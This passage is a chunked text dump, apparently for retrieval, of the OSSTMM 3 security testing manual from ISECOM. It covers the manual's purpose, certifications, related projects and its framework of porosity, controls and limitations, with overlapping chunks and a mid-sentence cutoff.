    "text": "equipment. Therefore, with version 3, the OSSTMM encompasses tests from all channels - Human, Physical, Wireless, Telecommunications, and Data Networks. This also makes it a perfectly suited for testing cloud computing, virtual infrastructures, messaging middleware, mobile communication infrastructures, high-security locations, human resources, trusted computing, and any logical processes which all cover multiple channels and require a different kind of security test. A set of attack surface metrics, called ravs, provide a powerful and highly flexible tool that can provide a graphical representation of state, and show changes in state over time. This integrates well with a ’dashboard’ for management and is beneficial for both internal and external testing, allowing a comparison/combination of the two. Quantitative risk management can be done from the OSSTMM Audit report findings, providing a much improved result due to more accurate, error free results however you will find the proposed trust management here to be superior to risk management. The OSSTMM includes information for project planning, quantifying results, and the rules of engagement for performing security audits. The methodology can be easily integrated with existing laws and policies to assure a thorough security audit through all channels. Legal and industry specific regulations also commonly require a security audit as a component of becoming compliant. An OSSTMM audit is well suited for most all of these cases. Specific OSSTMM tests can therefore be connected with particular security standard requirements, making the OSSTMM itself a way to gain compliance to those requirements. This applies to regulations and policies from physical security like the US Federal Energy Reserve Commission’s ruling to pure data security efforts such as the latest PCI-DSS and including cross-channel requirements as found in many NIST recommendations and information security management specifications like ISO/IEC 27001:2005, ISO/IEC 27002:2005, and ISO/IEC 27005:2008. It is recommended that you read through the OSSTMM once completely before putting it into practice. It aims to be a straight-forward tool for the implementation and documentation of a security test. Further assistance for those who need help in understanding and implementing this methodology is available at the ISECOM website. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 11\\nA Short Note About Language in the OSSTMM What is an audit? Some of the words used in this document may stray from the definition you are familiar with. New research often requires updating, enhancing, or retracting information from the world as we thought we have known it. This is a normal occurrence and to assist you with the changes, this document does try to define these words properly in their new context. In this document, an OSSTMM audit or “audit” is the result of the analysis performed after an OSSTMM test. The person who performs this function of test and analysis is referred to as the Security Analyst or just “Analyst”. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 12\\nPurpose The primary purpose of this manual is to provide a scientific methodology for the accurate characterization of operational security (OpSec) through examination and correlation of test",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 7
    }
  },
  {
    "text": "function of test and analysis is referred to as the Security Analyst or just “Analyst”. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 12\\nPurpose The primary purpose of this manual is to provide a scientific methodology for the accurate characterization of operational security (OpSec) through examination and correlation of test results in a consistent and reliable way. This manual is adaptable to almost any audit type, including penetration tests, ethical hacking, security assessments, vulnerability assessments, red-teaming, blue-teaming, and so forth. It is written as a security research document and is designed for factual security verification and presentation of metrics on a professional level. A secondary purpose is to provide guidelines which, when followed correctly, will allow the analyst to perform a certified OSSTMM audit. These guidelines exist to assure the following: 1. The test was conducted thoroughly. 2. The test included all necessary channels. 3. The posture for the test complied with the law. 4. The results are measurable in a quantifiable way. 5. The results are consistent and repeatable. 6. The results contain only facts as derived from the tests themselves. An indirect benefit of this manual is that it can act as a central reference in all security tests regardless of the size of the organization, technology, or protection. Document Scope The scope of this document is to provide specific descriptions for operational security tests over all operational channels, which include Human, Physical, Wireless, Telecommunications, and Data Networks, over any vector, and the description of derived metrics. This manual only focuses on OpSec and the use of the words safety and security are within this context. Liability This manual describes certain tests which are designed to elicit a response. Should these tests cause harm or damage, the Analyst may be liable according to the laws governing the Analyst’s location as well as the location of the tested systems. ISECOM makes no guarantee as to a harmless outcome of any test. Any Analyst applying this methodology cannot hold ISECOM liable for problems which arise during testing. In using this methodology, the Analyst agrees to assume this liability. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 13\\nCertification and Accreditation To produce an OSSTMM certified test which can receive accreditation for the operational security of the target, a STAR is required to be signed by the Analyst(s) who performed the test. The STAR must also meet the reporting requirements in this manual. The STAR can be submitted to ISECOM for review and official ISECOM certification. A certified test and an accredited report does not need to show that this entire manual or any specific subsections were followed. It needs only show what was and was not tested to be applicable for certification. (See Chapter 16, Making the STAR for details and an example of a STAR.) A certified OSSTMM audit provides the following benefits:  Serves as proof of a factual test  Holds Analyst responsible for the test  Provides a clear result to the client  Provides a more",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 8
    }
  },
  {
    "text": "certification. (See Chapter 16, Making the STAR for details and an example of a STAR.) A certified OSSTMM audit provides the following benefits:  Serves as proof of a factual test  Holds Analyst responsible for the test  Provides a clear result to the client  Provides a more comprehensive overview than an executive summary  Provides understandable metrics Test review, certification, and accreditation by ISECOM or an accredited third party is subject to further conditions and operations fees. Contact ISECOM for further information. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 14\\nCertifications for Professionals Anyone who uses this methodology for security testing and analysis and completes a valid STAR is said to have performed an OSSTMM audit. However, individual certification is also available through ISECOM for the applied skills in professional security testing, analysis, methodical process, and professional standards as outlined in the OSSTMM Rules of Engagement. ISECOM is the authority for a variety of skill and applied knowledge certification exams based on OSSTMM research. Classes and the official exams are provided by certified training partners in various regions around the world. The current certification exams available are: OPST The OSSTMM Professional Security Tester proves a candidate has the skill and knowledge to perform accurate & efficient security tests on data networks. http://www.opst.org OPSA The OSSTMM Professional Security Analyst proves a candidate can apply the principles of security analysis and attack surface metrics accurately & efficiently. http://www.opsa.org OPSE The OSSTMM Professional Security Expert proves a candidate has learned all the security concepts within the most current, publicly available OSSTMM and the background to the research. http://www.opse.org OWSE The OSSTMM Wireless Security Expert proves a candidate has the skill and knowledge to analyze and test the operational security of wireless technologies across the electromagnetic spectrum accurately & efficiently. http://www.owse.org CTA The Certified Trust Analyst proves a candidate has the skills and knowledge to efficiently evaluate the trust properties of any person, place, thing, system, or process and make accurate and efficient trust decisions. http://www.trustanalyst.org Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 15\\nCertifications for Organizations Certifications for organizations, infrastructure, and products is also available through ISECOM. The following certifications are available: Security Test Audit Report OSSTMM certification is available for organizations or parts of organizations that validate their security with the STAR from ISECOM. Validation of security tests and quarterly metrics are subject to the ISECOM validation requirements to assure a high level of trustworthiness in an organization. ISECOM Licensed Auditors ILAs have proven to ISECOM to have the competence and capacity to perform OSSTMM audits for themselves and for others. This provides for an easy and efficient way to maintain Security Test Audit Reports and have those reports certified by ISECOM. OSSTMM Seal of Approval OSSTMM evaluation seals are available for products, services, and business processes. This seal defines an operational state of security, safety, trust, and privacy. The successfully evaluated products, services, and processes carry their visible certification seal and rav score. This allows a purchaser to",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 9
    }
  },
  {
    "text": "certified by ISECOM. OSSTMM Seal of Approval OSSTMM evaluation seals are available for products, services, and business processes. This seal defines an operational state of security, safety, trust, and privacy. The successfully evaluated products, services, and processes carry their visible certification seal and rav score. This allows a purchaser to see precisely the amount and type of change in security that the evaluated solutions present. It removes the guesswork from procurement and allows one to find and compare alternative solutions. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 16\\nRelated Projects To properly test the security of anything, you first need to know how that thing operates, what it’s comprised of, and what is the environment it exists in. This is how the OSSTMM itself had been approached as a means of understanding the best, most efficient, and most thorough way to test security. Therefore, we needed to understand security. This research seeking the “security particle” as it turns out has brought about the application and design of more projects beyond the OSSTMM. While not all applications of the OSSTMM to areas outside of security testing are worthy of being projects. However, some do provide a testament to the fact that we are now only limited by our own imaginations. The OSSTMM has become a tool with which we can take new approaches to many new means of protection. Source Code Analysis Risk Evaluation (SCARE) The SCARE project applies the OSSTMM ravs to source code analysis. The end result is a SCARE value which is the amount of the source code with unprotected operations. http://www.isecom.org/scare Home Security Methodology and Vacation Guide (HSM) The HSM project applies the OSSTMM ravs, Four Point Process, Trust Metrics, and analysis process to protecting and fortifying a home. The end result is to create a home that is safer and more secure without restricting the freedoms of the occupants. http://www.isecom.org/hsm Hacker Highschool (HHS) HHS is a different kind of security awareness program for teens. It uses the OSSTMM testing and analysis research to provide knowledge and skills through hands-on lessons and access to an Internet-based test network. However while doing so, it reinforces resourcefulness and critical thinking skills. http://www.hackerhighschool.org The Bad People Project (BPP) The BPP is a different kind of security and safety awareness program for children and parents. It uses OSSTMM ravs and Trust Metrics to create better rules for children about safety and security to be explained through games, stories, and role play. The rules are easier to remember and free of contradictions and cultural biases. The parents can visit and contribute to the gallery of children’s drawings which examines what children think what a bad person looks like. These drawings are the further used to find new ways to reach children and improve the rules taught to them. http://www.badpeopleproject.org Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 17\\nSecurity Operations Maturity Architecture (SOMA) The SOMA project aims to provide the OSSTMM operational processes at the strategic level. This project applies ravs and Trust",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 10
    }
  },
  {
    "text": "further used to find new ways to reach children and improve the rules taught to them. http://www.badpeopleproject.org Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 17\\nSecurity Operations Maturity Architecture (SOMA) The SOMA project aims to provide the OSSTMM operational processes at the strategic level. This project applies ravs and Trust Metrics to determining security maturity by how well protection strategy and tactics work and not just how they should work according to policy. http://www.isecom.org/soma Business Integrity Testing (BIT) The BIT project extends the OSSTMM operational testing and analysis to business processes and transactions. This adds new strategic insight to the security of business conduct by employees and in the development of new business plans. http://www.isecom.org/bit Smarter Safer Better This project provides the safety and security tools and skills people need every day to combat fraud, lies, and deception. The tools are based on the OSSTMM research which is focused on avoiding persuasive tricks and manipulation techniques. The project is unique in how it utilizes support groups for people to discuss issues they have encountered and work together to analyze the problems. http://www.smartersaferbetter.org Mastering Trust This project is to create seminar materials and workbooks on how to use the OSSTMM Trust Metrics in every day life to make better decisions. This project addresses why our gut instincts are broken and how we can fix and improve them. Whether its in business or private relationships, knowing who you can trust and how much is more than protecting yourself from being hurt, it ́s a competitive edge. http://www.isecom.org/seminars Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 18\\nSecurity doesn’t have to last forever; just longer than everything else that might notice it’s gone. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 19\\nChapter 1 – What You Need to Know This manual is about operational security (OpSec). It is about measuring how well security works. While this may seem plain and obvious: “Don’t we all do operational security?” it is a distinction which must be made because most compliance objectives require no more than matching processes and configurations to a set of best practices. This manual and the testing process it outlines requires that you make no assumptions that a security solution, product, or process will behave during operational use as it has been designated to do on paper. More simply, this methodology will tell you if what you have does what you want it to do and not just what it was told to do. OpSec is a combination of separation and controls. Under OpSec, for a threat to be effective, it must interact either directly or indirectly with the asset. To separate the threat from the asset is to avoid a possible interaction. Therefore it is possible to have total (100%) security if the threat and the asset are completely separated from each other. Otherwise what you have is safety of the asset which is provided by the controls you put on the asset or the degree to which you lessen the impact",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 11
    }
  },
  {
    "text": "Therefore it is possible to have total (100%) security if the threat and the asset are completely separated from each other. Otherwise what you have is safety of the asset which is provided by the controls you put on the asset or the degree to which you lessen the impact of the threat. For example, to be secure from lightning, one must move to where lightning can’t reach such as deep in a mountain. Threats which can’t be separated from the assets must be made safer so that their interactions and any effects from interactions do little or no harm. In this same example, to be safe from lightning, one must stay indoors during storms, avoid windows or other openings, and use lightning rods on the roof. Therefore, under the context of operational security, we call security the separation of an asset and a threat and safety the control of a threat or its effects. To have true safety of the assets different types of controls are required. However, controls also may increase the number of interactions within the scope which means more controls are not necessarily better. Therefore it is recommended to use different types of operational controls rather than just more controls. More controls of the same type of operational controls do not provide a defense in depth as access through one is often access through all of that type. This is why it is so important to be able to categorize controls by what they do in operations to be certain of the level of protection provided by them. To better understand how OpSec can work within an operational environment, it must be reduced to its elements. These elements allow one to quantify the Attack Surface, which is the lack of specific separations and functional controls that exist for that Vector, the direction of the interaction. The reductionist approach resolves to us needing to see security and safety in a new way, one that allows for them to exist independent of risk and fully capable of creating Perfect Security, the exact balance of security and controls with operations and limitations. However, to see security in a new way requires new terminology as well. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 20\\nTerm Definition The lack of specific separations and functional controls that exist for that Attack Surface vector. A sub-scope of a vector created in order to approach the security testing of a complex scope in an organized manner. It is based on the divide and conquer algorithm design paradigm that consists in recursively breaking Attack Vector down a problem into two or more sub-problems of the same (or related) type, until these become simple enough to be solved directly. Impact and loss reduction controls. The assurance that the physical and information assets as well as the channels themselves are protected from various types of invalid interactions as defined by the channel. For example, insuring the store in the case of fire is a control that does",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 12
    }
  },
  {
    "text": "be solved directly. Impact and loss reduction controls. The assurance that the physical and information assets as well as the channels themselves are protected from various types of invalid interactions as defined by the channel. For example, insuring the store in the case of fire is a control that does not prevent the inventory from getting damaged or stolen but will pay out Controls equivalent value for the loss. Ten controls have been defined. The first five controls are Class A and control interactions. The five Class B controls are relevant to controlling procedures. See section 1.2 below for further information regarding controls. This is the current state of perceived and known limits for channels, operations, and controls as verified within the audit. Limitation types are classified by how they interact with security and safety on an operational level. Therefore, opinions as to impact, availability in the wild, difficulty to perform, and complexity are not used to classify them. For example, an old rusted lock used to secure the gates of the store at closing time has an imposed security limitation providing a fraction of the protection strength Limitations necessary to delay or withstand an attack. Determining that the lock is old and weak through visual verification is referred to as an identified limitation. Determining it is old and weak by breaking it using 100 kg of force when a successful deterrent requires 1000 kg of force shows a verified limitation. One of its limitations is then classified based on the consequence of the operational action, which in this case is Access. Operations are the lack of security one must have to be interactive, useful, public, open, or available. For example, limiting how a person buys goods Operations or services from a store over a particular channel, such as one door for going in and out, is a method of security within the store’s operations. The exact balance of security and controls with operations and limitations. Perfect Security All interactive points, operations, which are categorized as a Visibility, Porosity Access, or Trust. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 21\\nTerm Definition A form of protection where the threat or its effects are controlled. In order to be safe, the controls must be in place to assure the threat itself or the effects of the threat are minimized to an acceptable level by the asset Safety owner or manager. This manual covers safety as “controls” which are the means to mitigate attacks in an operational or live environment. A form of protection where a separation is created between the assets and the threat. This includes but is not limited to the elimination of either the asset or the threat. In order to be secure, the asset is removed from the Security threat or the threat is removed from the asset. This manual covers security from an operational perspective, verifying security measures in an operating or live environment. The rav is a scale measurement of an attack surface, the amount of",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 13
    }
  },
  {
    "text": "order to be secure, the asset is removed from the Security threat or the threat is removed from the asset. This manual covers security from an operational perspective, verifying security measures in an operating or live environment. The rav is a scale measurement of an attack surface, the amount of uncontrolled interactions with a target, which is calculated by the quantitative balance between porosity, limitations, and controls. In this scale, 100 rav (also sometimes shown as 100% rav) is perfect balance and Rav anything less is too few controls and therefore a greater attack surface. More than 100 rav shows more controls than are necessary which itself may be a problem as controls often add interactions within a scope as well as complexity and maintenance issues. That within the scope that you are attacking, which is comprised of the Target asset and any protections the asset may have. The direction of an interaction. Vector One classification of Limitation where a person or process can access, deny access to others, or hide itself or assets within the scope. More details Vulnerability and examples are available in the Limitations table in 4.2. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 22\\n1.1 Security Security is a function of a separation. Either the separation between an asset and any threats exists or it does not. There are 3 logical and proactive ways to create this separation: 1. Move the asset to create a physical or logical barrier between it and the threats. 2. Change the threat to a harmless state. 3. Destroy the threat. When analyzing the state of security we can see where there is the possibility for interaction and where there is not. We know some, all, or even none of these interactions may be required for operations. Like doors into a building, some of the doors are needed for customers and others for workers. However, each door is an interactive point which can increase both necessary operations and unwanted ones, like theft. Since the security tester may not know at this point the business justification for all these interactive points, we refer to this as the porosity. The porosity reduces the separation between a threat and an access. It is further categorized as one of 3 elements, visibility, access, or trust which describes its function in operations which further allows the proper controls to be added during the remediation phase of improving protection. So consider that if the separation exists properly from the threats, such as a man inside a mountain avoiding lightning, then that security is true; it is 100%. For every hole in the mountain, every means for lightning to cause harm to that man, the porosity increases as an Access. Each point of interaction reduces the security below 100%, where 100% represents a full separation. Therefore, the increase in porosity is the decrease in security and each pore is either a Visibility, Access, or Trust. Term Definition Police science places “opportunity” as one of the three elements which",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 14
    }
  },
  {
    "text": "an Access. Each point of interaction reduces the security below 100%, where 100% represents a full separation. Therefore, the increase in porosity is the decrease in security and each pore is either a Visibility, Access, or Trust. Term Definition Police science places “opportunity” as one of the three elements which encourage theft, along with “benefit”, and “diminished risk”. Visibility is a means of calculating opportunity. It is each target’s asset known to exist Visibility within the scope. Unknown assets are only in danger of being discovered as opposed to being in danger of being targeted. Since security is the separation of a threat and an asset then the ability to interact with the asset directly is to access it. Access is calculated by the number of different places where the interaction can occur. Removing Access direct interaction with an asset will halve the number of ways it can be taken away. We measure trust as part of OpSec as each relationship that exists where the target accepts interaction freely from another target within the scope. While a trust may be a security hole, it is a common replacement for authentication and a means for evaluating relationships in a rational and Trust repeatable manner. Therefore, the use of trust metrics is encouraged which will allow for one to measure how valid a trust is by calculating the amount of reliability in the trust. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 23\\n1.2 Controls When the threat is all around then it is controls which will provide safety in operations. Controls are a means to influence the impact of threats and their effects when interaction is required. Just because you can’t directly control it doesn’t mean it can’t be controlled. Control the environment and you control everything in it. While there are many different names and types of operation controls, there are only 12 main categories which contain all possible controls. Two of the categories however, Identification, the verification of an existing identity, and Authorization, the granting of permissions from the rightful authority, cannot stand alone in an operational environment and instead, in operations, combine and are added to the Authentication control. This leaves OpSec with ten possible controls an Analyst will need to identify and understand. The reason why Identification and Authorization cannot be expressed operationally is because neither can be transferred. Identity exists as is and while the means of identification, as a process, is an operational aspect, the actual process is to verify a previously provided identity from another source or from the latest in a chain of sources. Even under circumstances where a government agency officially changes the identity of a person, they are still the same person from identifying marks to their DNA and only their documentation changes. Therefore, a security process can attempt to identify someone by verifying their identity but nothing in this case is granted or provided. There is no true “granting” of identity just as there can be no true “theft” of identity.",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 15
    }
  },
  {
    "text": "from identifying marks to their DNA and only their documentation changes. Therefore, a security process can attempt to identify someone by verifying their identity but nothing in this case is granted or provided. There is no true “granting” of identity just as there can be no true “theft” of identity. Furthermore, identity is a collection of thoughts, emotions, experiences, relationships, and intentions, as well as physical shape or marks. You are who you are because you exist not because someone granted that to you. A perfect duplicate or clone of you is still not you because from origin your experiences will differ. While this may sound more like philosophy than security, it is very important that Analysts understand this. Identification processes only verify against a former identification process. If that process has been corrupted or can be circumvented, then the entire security foundation that requires proper identification is flawed. Authorization, like Identification, is another operations control which cannot be transferred. It is the control to grant permissions. An employee authorized to enter a room may hold the door open for another person to enter. This does not authorize the new person. Authorization did not get transferred. This new person is trespassing in a restricted area and the employee who held open the door actually was part of a limitation in the Authentication process to grant Access. Another property of Authorization is that it requires identification to work. Without identification, authorization is a blanket “permit all” without even knowing what all is. However in operations this is itself a paradox because to authorize all without scrutiny means that there is no authorization. Therefore to not authorize you do not use authorization. The Authentication control combines both identification and authorization to map Access. The process is simply knowing who (or what) it is and what, where, when, and how they can access before they are granted access. Because authentication is a control for interactivity, it is one of the five Class A controls, also known as the “Interactive Controls”. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 24\\nInteractive Controls The Class A Interactive Controls make up exactly half of all the operation controls. These controls directly influence visibility, access, or trust interactions. The Class A categories are Authentication, Indemnification, Subjugation, Continuity, and Resilience. 1. Authentication is a control through the challenge of credentials based on identification and authorization. 2. Indemnification is a control through a contract between the asset owner and the interacting party. This contract may be in the form of a visible warning as a precursor to legal action if posted rules are not followed, specific, public legislative protection, or with a third-party assurance provider in case of damages like an insurance company. 3. Resilience is a control over all interactions to maintain the protection of assets in the event of corruption or failure. 4. Subjugation is a control assuring that interactions occur only according to defined processes. The asset owner defines how the interaction occurs which removes the freedom",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 16
    }
  },
  {
    "text": "an insurance company. 3. Resilience is a control over all interactions to maintain the protection of assets in the event of corruption or failure. 4. Subjugation is a control assuring that interactions occur only according to defined processes. The asset owner defines how the interaction occurs which removes the freedom of choice but also the liability of loss from the interacting party. 5. Continuity is a control over all interactions to maintain interactivity with assets in the event of corruption or failure. Process Controls The other half of operation controls are the Class B controls which are used to create defensive processes. These controls do not directly influence interactions rather they protect the assets once the threat is present. These are also known as Process Controls and include Non-repudiation, Confidentiality, Privacy, Integrity, and Alarm. 6. Non-repudiation is a control which prevents the interacting party from denying its role in any interactivity. 7. Confidentiality is a control for assuring an asset displayed or exchanged between interacting parties cannot be known outside of those parties. 8. Privacy is a control for assuring the means of how an asset is accessed, displayed, or exchanged between parties cannot be known outside of those parties. 9. Integrity is a control to assure that interacting parties know when assets and processes have changed. 10. Alarm is a control to notify that an interaction is occurring or has occurred. While controls are a positive influence in OpSec, minimizing the attack surface, they can themselves add to the attack surface if they themselves have limitations. Often times this effect is not noticed and if the protection mechanisms aren’t tested thoroughly as to how they work under all conditions, this may not become apparent. Therefore the use of controls must assure that they do not insinuate new attack vectors into the target. Therefore, sometimes no controls are better than bad controls. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 25\\nThe Bad Lock Example Is a bad lock on a door better than no lock at all? An Analyst must use critical security thinking, a form of logic skills to overcome the innate sense of security we carry to understand why bad controls can increase the attack surface to greater than no control at all. Common thought is that adding controls with limitations are better than having none at all. Is it not better to have a poor lock than to have no lock at all? After all, as conventional wisdom suggests, a wisdom borne of emotion rather than verification, some “security” is better than none. This is why the analogy of the lock is such a good example and actually does better to answer the question then any other because it shows so well how we misunderstand controls that are so common around us. Ask anyone who has had to break open a locked door where they kick or hit the door to open it? That answer differs whether it is a key lock opened from the outside as",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 17
    }
  },
  {
    "text": "because it shows so well how we misunderstand controls that are so common around us. Ask anyone who has had to break open a locked door where they kick or hit the door to open it? That answer differs whether it is a key lock opened from the outside as opposed to a bolt lock on the inside. There’s a reason for this. When a lock (which is considered the authentication control) is added to a door, the heavy, solid door needs to have a space hollowed out and the lock inserted. That creates a limitation, a weak spot in the door. So does adding a handle. Doors with no handles or internal locks do not have this limitation. However they require the door to be opened from the inside in another means. So to open a door with that kind of lock, you kick or hit the door at the handle or lock mechanism. If there is a bolt lock, that limitation does not exist because the door remains solid. Those doors often require a force to open that will sooner break the door than the lock. Doors made to withstand high pressures have the bolts on the outside and the opening mechanism in the center of the door as a small hole, like doors on a boat or submarine, to avoid the weaknesses of hollowing out part of the door. Now to more directly answer the question: if it is better to have a weak lock than no lock. This question refers to a door with the minimum, a cheap or simple key lock (authentication) that can be bypassed by someone who wants to enter. So if we know the authentication is weak, then we know somebody can get in and even worse, they can do it without damaging the lock or the door which means we may have no knowledge of the intrusion. If you think, well, that’s okay because our problem isn’t the real crooks, it’s the opportunists looking for the low- hanging fruit then you’re making a risk decision and that does not affect your attack surface which is made from what you have and not what you want. Furthermore, by having a lock at all implies, most of all to the opportunists, that there is something of value inside. If you add a control, any control, you increase the attack surface of anything. If that new thing you add brings a new attack vector then you were probably better off without. In some cases, the new attack vector is smaller than the actual amount of safety the new control gives you. However, a good control will have no limitations and can shrink the attack surface. A lock in a door should not be easily subverted or add to the attack surface in a significant way. Such a lock requires force to open and that adds another control then which the lock provides, alarm. A broken lock is also a good notification of a break-in.",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 18
    }
  },
  {
    "text": "surface. A lock in a door should not be easily subverted or add to the attack surface in a significant way. Such a lock requires force to open and that adds another control then which the lock provides, alarm. A broken lock is also a good notification of a break-in. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 26\\n1.3 Information Assurance Objectives To facilitate understanding of operation controls, they can be matched back to the three Information Assurance Objectives of Confidentiality, Availability, and Integrity. These objectives are used across the information security industry although due in part to their over-simplification, they are more for the benefit of managing it rather than creating it or testing it. The mapping is not a perfect 1:1 however it is sufficient to demonstrate operation controls according to the basic CIA Triad. Because the definitions used for CIA are very broad the mappings appear to be as such: Information Assurance Objectives Operation Controls Confidentiality Privacy Confidentiality Authentication Resilience Integrity Non-repudiation Integrity Subjugation Continuity Indemnification Availability Alarm Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 27\\n1.4 Limitations The inability of protection mechanisms to work are their limitations. Therefore the state of security in regard to known flaws and restrictions within the operations scope is called Limitation. It is the holes, vulnerabilities, weaknesses, and problems in keeping that separation between an asset and a threat or in assuring controls continue working correctly. Limitations have been classified into five categories and these categories define the type of vulnerability, mistake, misconfiguration, or deficiency by operation. This is different from how limitations are classified under most security management frameworks and best practices which is why we use the term Limitation rather than more common terms to avoid confusion. Those other terms refer to vulnerabilities or deficiencies because they are categorized by the type of attack or often the threat itself. There is a focus on the risk from the attack. However, to remove bias from security metrics and provide a more fair assessment we removed the use of risk. Risk itself is heavily biased and often highly variable depending on the environment, assets, threats, and many more factors. Therefore, under OpSec, we use the term Limitations to express the difference of categorizing how OpSec fails rather than by the type of threat. Since the number and type of threats cannot be known it makes more sense to understand a security or safety mechanism based on when it will fail. This allows the Analyst to test for the conditions in which it will no longer sustain the necessary level of protection. Only once we have this knowledge can we begin to play the what-if game of threats and risks. Then we can also invest in the appropriate type of separation or controls required and create precise plans for disasters and contingencies. Although the Limitations are categorized here as 1 through 5 this does not mean they are in a hierarchical format of severity. Rather they are numbered only to differentiate them",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 19
    }
  },
  {
    "text": "can also invest in the appropriate type of separation or controls required and create precise plans for disasters and contingencies. Although the Limitations are categorized here as 1 through 5 this does not mean they are in a hierarchical format of severity. Rather they are numbered only to differentiate them both for operational planning and metrics. This also means it is possible that more than one type of Limitation can be applied to a single problem. Furthermore, the weight (value) of a particular Limitation is based on the other available and corresponding controls and interactive areas to the scope, there can be no specific hierarchy since the value of each is specific to the protective measures in the scope being audited. Within the OSSTMM the five Limitation classifications are: 1. Vulnerability is the flaw or error that: (a) denies access to assets for authorized people or processes, (b) allows for privileged access to assets to unauthorized people or processes, or (c) allows unauthorized people or processes to hide assets or themselves within the scope. 2. Weakness is the flaw or error that disrupts, reduces, abuses, or nullifies specifically the effects of the five interactivity controls: authentication, indemnification, resilience, subjugation, and continuity. 3. Concern is the flaw or error that disrupts, reduces, abuses, or nullifies the effects of the flow or execution of the five process controls: non-repudiation, confidentiality, privacy, integrity, and alarm. 4. Exposure is an unjustifiable action, flaw, or error that provides direct or indirect visibility of targets or assets within the chosen scope channel. 5. Anomaly is any unidentifiable or unknown element which has not been controlled and cannot be accounted for in normal operations. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 28\\nLimitations Mapping To better understand how Limitations fit into the OpSec framework, it can be seen mapping back to security and safety: Category OpSec Limitations Visibility Exposure Operations Access Vulnerability Trust Authentication Weakness Indemnification Class A - Resilience Interactive Subjugation Continuity Controls Non-Repudiation Concern Confidentiality Class B - Privacy Process Integrity Alarm Anomalies This mapping shows how Limitations effect security and how there values are determined. A vulnerability is the flaw or error that: (a) denies access to assets for authorized people or processes (b) allows for privileged access to assets to unauthorized people or processes, or (c) allows unauthorized people or processes to hide assets or themselves within the scope. This means that Vulnerability must be mapped to all points of interaction or OpSec and because Vulnerability can circumnavigate or nullify the Controls, these must also be considered in the weighting of Vulnerability. A weakness is a flaw in Class A Controls however can impact OpSec therefore it is mapped to all OpSec parameters as well as being mapped to this interactive class of controls. A concern can only be found in Class B Controls however can impact OpSec therefore it is mapped to all OpSec parameters as well as being mapped to this process class of controls. An exposure gives us intelligence about",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 20
    }
  },
  {
    "text": "as well as being mapped to this interactive class of controls. A concern can only be found in Class B Controls however can impact OpSec therefore it is mapped to all OpSec parameters as well as being mapped to this process class of controls. An exposure gives us intelligence about the interaction with a target and thus maps directly to Visibility and Access. This intelligence can also help an attacker navigate around some or all controls and so Exposure is also mapped to both Control classes. Finally, Exposure has no value itself unless there is a way to use this intelligence to exploit the asset or a Control and so Vulnerabilities, Weaknesses and Concerns also play a role in the weighting of Exposure’s value. An anomaly is any unidentifiable or unknown element which has not been controlled and cannot be accounted for in normal operations. The fact that it has not been controlled and cannot be accounted for signifies a direct link with Trust. This Limitation can also cause anomalies in the way Controls function and so they are also included in the weighting. Finally, as with an Exposure, an Anomaly alone does not affect OpSec without the existence of either a Vulnerability, Weakness or Concern which can exploit this unusual behavior. Additionally, more than one category can apply to a limitation when the flaw breaks OpSec in more than Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 29\\none place. For example, an Authentication control which allows a person to hijack another person’s credentials has a Weakness and should the credentials allow Access then it also has a Vulnerability. In another example, an Authentication control uses a common list of names corresponding to e-mail addresses. Every address which can be found or guessed and used as a log-in is an Exposure while the control itself has a Weakness for its inability to identify the correct user of the Authentication mechanism of the log-in. If any of those credentials allow Access then we include this as a Vulnerability as well. Justification for Limitations The concept that limitations are only limitations if they have no business justification is false. A limitation is a limitation if it behaves 